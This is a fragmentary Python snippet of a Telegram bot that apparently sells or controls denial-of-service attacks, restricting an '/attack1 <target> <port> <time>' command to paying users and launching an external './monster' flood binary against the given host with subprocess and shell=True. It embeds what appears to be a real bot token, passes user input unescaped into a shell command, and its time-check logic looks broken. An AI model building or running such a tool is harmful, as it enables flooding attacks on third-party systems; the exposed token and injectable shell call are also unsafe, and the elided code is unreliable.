...
bot = telebot.TeleBot('7791394191:AAG4XXCeubVvT7eU8O07MfDCP_UjfQ2ECUs')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./monster  {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"monster  🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/monster CRACKER"
        else:
            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/monster CRACKER"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @monster CRACKER"
